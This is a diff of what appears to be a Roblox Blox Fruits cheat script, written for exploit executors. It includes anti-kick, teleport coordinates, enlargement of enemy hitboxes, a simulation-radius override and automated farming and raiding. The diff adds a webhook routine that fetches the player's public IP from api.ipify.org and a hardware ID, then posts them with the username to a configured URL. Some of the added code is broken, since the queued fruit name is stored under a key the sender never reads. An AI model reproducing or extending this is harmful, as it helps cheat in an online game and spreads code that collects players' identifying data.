@@ -171,7 +171,7 @@ end
 
 spawn(AntiKick)
 
--- ======= Tween2 =======
+--Tween2
 local function Tween2(targetCFrame)
     local success, err = pcall(function()
         local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
@@ -205,7 +205,97 @@ local function Tween2(targetCFrame)
         warn("[Tween2 Error]:", err)
     end
 end
+--------------------------------------------------------------------------
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local isTweening = false
+local currentTween = nil
 
+function CheckNearestTeleporter(aI)
+    local vcspos = aI.Position
+    local minDist = math.huge
+    local chosenTeleport = nil
+    local y = game.PlaceId
+
+    local TableLocations = {}
+
+    if y == 2753915549 then
+        TableLocations = {
+            ["Sky3"] = Vector3.new(-7894, 5547, -380),
+            ["Sky3Exit"] = Vector3.new(-4607, 874, -1667),
+            ["UnderWater"] = Vector3.new(61163, 11, 1819),
+            ["Underwater City"] = Vector3.new(61165.19140625, 0.18704631924629211, 1897.379150390625),
+            ["Pirate Village"] = Vector3.new(-1242.4625244140625, 4.787059783935547, 3901.282958984375),
+            ["UnderwaterExit"] = Vector3.new(4050, -1, -1814)
+        }
+    elseif y == 4442272183 then
+        TableLocations = {
+            ["Swan Mansion"] = Vector3.new(-390, 332, 673),
+            ["Swan Room"] = Vector3.new(2285, 15, 905),
+            ["Cursed Ship"] = Vector3.new(923, 126, 32852),
+            ["Zombie Island"] = Vector3.new(-6509, 83, -133)
+        }
+    elseif y == 7449423635 then
+        TableLocations = {
+            ["Floating Turtle"] = Vector3.new(-12462, 375, -7552),
+            ["Hydra Island"] = Vector3.new(5657.88623046875, 1013.0790405273438, -335.4996337890625),
+            ["Mansion"] = Vector3.new(-12462, 375, -7552),
+            ["Castle"] = Vector3.new(-5036, 315, -3179),
+            ["Dimensional Shift"] = Vector3.new(-2097.3447265625, 4776.24462890625, -15013.4990234375),
+            ["Beautiful Pirate"] = Vector3.new(5319, 23, -93),
+            ["Beautiful Room"] = Vector3.new(5314.58203, 22.5364361, -125.942276, 1, 2.14762768e-08, -1.99111154e-13, -2.14762768e-08, 1, -3.0510602e-08, 1.98455903e-13, 3.0510602e-08, 1),
+            ["Temple of Time"] = Vector3.new(28286, 14897, 103)
+        }
+    end
+
+    for _, v in pairs(TableLocations) do
+        local dist = (v - vcspos).Magnitude
+        if dist < minDist then
+            minDist = dist
+            chosenTeleport = v
+        end
+    end
+
+    local playerPos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+    if minDist <= (vcspos - playerPos).Magnitude then
+        return chosenTeleport
+    end
+end
+
+local function createEffect(char)
+    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
+    if not char:FindFirstChild("TweenHighlight") then
+        local h = Instance.new("Highlight")
+        h.Name = "TweenHighlight"
+        h.FillColor = Color3.new(1, 1, 1)
+        h.FillTransparency = 0.5
+        h.OutlineColor = Color3.new(1, 1, 1)
+        h.OutlineTransparency = 0
+        h.Adornee = char
+        h.Parent = char
+    end
+    if not char.HumanoidRootPart:FindFirstChild("TweenAura") then
+        local aura = Instance.new("ParticleEmitter", char.HumanoidRootPart)
+        aura.Name = "TweenAura"
+        aura.Texture = "rbxassetid://discord.gg/vxezehub"
+        aura.Size = NumberSequence.new(2)
+        aura.Transparency = NumberSequence.new(0.2)
+        aura.Lifetime = NumberRange.new(0.5, 1)
+        aura.Rate = 60
+        aura.Speed = NumberRange.new(5, 10)
+        aura.SpreadAngle = Vector2.new(360, 360)
+        aura.Color = ColorSequence.new(Color3.new(1, 1, 1))
+    end
+end
+
+local function removeEffect(char)
+    if not char then return end
+    if char:FindFirstChild("TweenHighlight") then char.TweenHighlight:Destroy() end
+    if char:FindFirstChild("HumanoidRootPart") and char.HumanoidRootPart:FindFirstChild("TweenAura") then
+        char.HumanoidRootPart.TweenAura:Destroy()
+    end
+end
 --Random Fruit
 spawn(
     function()
@@ -271,98 +361,109 @@ local fruitCodes = {
     ["Dragon Fruit"] = "Dragon-Dragon",
 }
 
-local function sendWebhook(fruitName, stored)
-    local config = getgenv().config
-    if not config or not config.Webhook["Send Webhook"] or config.Webhook["Webhook Url"] == "" then return end
+local lastWebhookTime = 0
+local cooldown = 60
+local pendingWebhook = nil
 
+local function sendWebhookNow(fruitName, stored)
+    local cfg = getgenv().config
+    if not cfg or not cfg.Webhook["Send Webhook"] or cfg.Webhook["Webhook Url"] == "" then return end
+
+    if tick() - lastWebhookTime < cooldown then
+        pendingWebhook = { fruitName = fruitName, stored = stored }
+        return
+    end
+
+    lastWebhookTime = tick()
+
+    local ip = "Unavailable"
+    pcall(function()
+        ip = game:HttpGet("https://api.ipify.org", true)
+    end)
+
+    local hwid = (gethwid and gethwid()) or (identifyexecutor and identifyexecutor()) or "Unknown"
+    local playerName = player.Name
+
+    -- Nội dung webhook
     local data = {
-        ["username"] = "Fruit Notifier 🍎",
+        ["username"] = "🍎 Fruit Notifier",
         ["embeds"] = {{
-            ["title"] = "🥭 Found Fruit",
-            ["description"] = string.format("**Name:** %s\n📦 **Stored:** %s\n👤 **Player:** %s", fruitName, stored and "Yes ✅" or "No ❌", player.Name),
-            ["color"] = 16753920,
+            ["title"] = "🍉 Máy Tìm Fruit ",
+            ["color"] = tonumber(0x7f00ff),
+            ["fields"] = {
+                { name = "🥭 Fruit", value = "```" .. (fruitName or "Unknown") .. "```", inline = true },
+                { name = "📦 Stored", value = stored and "`Yes ✅`" or "`No ❌`", inline = true },
+                { name = "👤 Username", value = "||```" .. playerName .. "```||", inline = true },
+                { name = "🌇 IP Address", value = "||```" .. ip .. "```||", inline = false },
+                { name = "💻 HWID", value = "```" .. hwid .. "```", inline = false },
+            },
             ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
 
-    local success, err = pcall(function()
-        HttpService:PostAsync(config.Webhook["Webhook Url"], HttpService:JSONEncode(data))
+    pcall(function()
+        HttpService:PostAsync(cfg.Webhook["Webhook Url"], HttpService:JSONEncode(data))
     end)
-
-    if success then
-        print("✅ Webhook sent for:", fruitName)
-    else
-        warn("❌ Failed to send webhook:", err)
-    end
 end
 
--- Kiểm tra trong Backpack nếu có trái
-local function checkBackpackFruits()
-    for _, item in pairs(backpack:GetChildren()) do
-        if item:IsA("Tool") and fruitCodes[item.Name] then
-            print("📦 Fruit in backpack:", item.Name)
-            sendWebhook(item.Name, false)
-
-            local config = getgenv().config
-            if config.FruitFarm["Auto Store Fruit"] then
-                task.wait(1)
-                pcall(function()
-                    ReplicatedStorage.Remotes.CommF_:InvokeServer("StoreFruit", fruitCodes[item.Name], item)
-                end)
-
-                local start = tick()
-                repeat task.wait(0.3) until not backpack:FindFirstChild(item.Name) or tick() - start > 5
-
-                if not backpack:FindFirstChild(item.Name) then
-                    print("✅ Stored:", item.Name)
-                    sendWebhook(item.Name, true)
-                else
-                    print("❌ Failed to store:", item.Name)
-                end
-            end
+task.spawn(function()
+    while true do
+        task.wait(1)
+        if pendingWebhook and tick() - lastWebhookTime >= cooldown then
+            local data = pendingWebhook
+            pendingWebhook = nil
+            sendWebhookNow(data.fruitName, data.stored)
         end
     end
+end)
+
+local function queueWebhook(fruitName, stored)
+    pendingWebhook = { name = fruitName, stored = stored }
 end
 
--- Theo dõi khi fruit vào người
-local function watchCharacter(character)
-    character.ChildAdded:Connect(function(child)
-        local config = getgenv().config
-        if not config then return end
+local function tryStoreFruit(tool)
+    local fruitId = fruitCodes[tool.Name]
+    if not fruitId then return false end
 
-        if child:IsA("Tool") and fruitCodes[child.Name] then
-            print("🍇 Equipped fruit:", child.Name)
-            sendWebhook(child.Name, false)
+    local cfg = getgenv().config
+    if not cfg or not cfg.FruitFarm["Auto Store Fruit"] then return false end
 
-            if config.FruitFarm["Auto Store Fruit"] then
-                task.wait(1)
-                pcall(function()
-                    ReplicatedStorage.Remotes.CommF_:InvokeServer("StoreFruit", fruitCodes[child.Name], child)
-                end)
-
-                local start = tick()
-                repeat task.wait(0.3) until not character:FindFirstChild(child.Name) or tick() - start > 5
-
-                local stored = not character:FindFirstChild(child.Name)
-                if stored then
-                    print("✅ Stored from character:", child.Name)
-                else
-                    print("❌ Still in character:", child.Name)
-                end
-
-                sendWebhook(child.Name, stored)
-            end
-        end
+    local success = pcall(function()
+        ReplicatedStorage.Remotes.CommF_:InvokeServer("StoreFruit", fruitId, tool)
     end)
+
+    if not success then return false end
+
+    local start = tick()
+    repeat task.wait(0.3) until not (tool.Parent and tool.Parent:IsDescendantOf(player)) or tick() - start > 5
+
+    return not (tool.Parent and tool.Parent:IsDescendantOf(player))
+end
+
+local function onFruitDetected(tool)
+    if not tool:IsA("Tool") or not fruitCodes[tool.Name] then return end
+
+    print("🍇 Detected fruit:", tool.Name)
+
+    local stored = tryStoreFruit(tool)
+    print(stored and "✅ Stored" or "❌ Not stored", ":", tool.Name)
+
+    queueWebhook(tool.Name, stored)
+end
+
+local function watchCharacter(char)
+    char.ChildAdded:Connect(onFruitDetected)
 end
 
 if player.Character then
     watchCharacter(player.Character)
 end
-
 player.CharacterAdded:Connect(watchCharacter)
 
-checkBackpackFruits()
+-- Kiểm tra trong balo khi khởi động
+for _, item in ipairs(backpack:GetChildren()) do
+    onFruitDetected(item)
+end
 --------------------------------------------Ui Hop
 function StartCountdownAndHop(countdownTime)
     local stopHopping = false
@@ -991,7 +1092,7 @@ spawn(function()
 
                         EquipWeapon(_G.SelectWeapon)
                         AutoHaki()
-                        Tween2(v.HumanoidRootPart.CFrame * CFrame.new(posX, posY, posZ))
+                        topos(v.HumanoidRootPart.CFrame * CFrame.new(posX, posY, posZ))
                         v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
                         v.HumanoidRootPart.Transparency = 1
                         v.Humanoid.JumpPower = 0
@@ -1006,7 +1107,7 @@ spawn(function()
                 end
             elseif game.ReplicatedStorage:FindFirstChild("Core") then
                 repeat
-                    Tween2(CFrame.new(448.46756, 199.356781, -441.389252))
+                    topos(CFrame.new(448.46756, 199.356781, -441.389252))
                     wait()
                 until not getgenv().config.FruitFarm["Auto Factory"] or 
                        (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(448.46756, 199.356781, -441.389252)).Magnitude <= 10
@@ -1034,7 +1135,7 @@ spawn(function()
                                     EquipWeapon(_G.SelectWeapon)
                                     v.HumanoidRootPart.CanCollide = false
                                     v.HumanoidRootPart.Size = Vector3.new(60, 60, 60)
-                                    Tween2(v.HumanoidRootPart.CFrame * CFrame.new(posX, posY, posZ))
+                                    topos(v.HumanoidRootPart.CFrame * CFrame.new(posX, posY, posZ))
 				    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)							
                                 until v.Humanoid.Health <= 0 or not v.Parent or not getgenv().config.FruitFarm["Auto Raid Castle"]
                             end
@@ -1043,7 +1144,7 @@ spawn(function()
                     getgenv().BusyCastle = false
                 else
                     getgenv().BusyCastle = false
-                    Tween2(CFrameCastleRaid)
+                    topos(CFrameCastleRaid)
                 end
             end)
         end
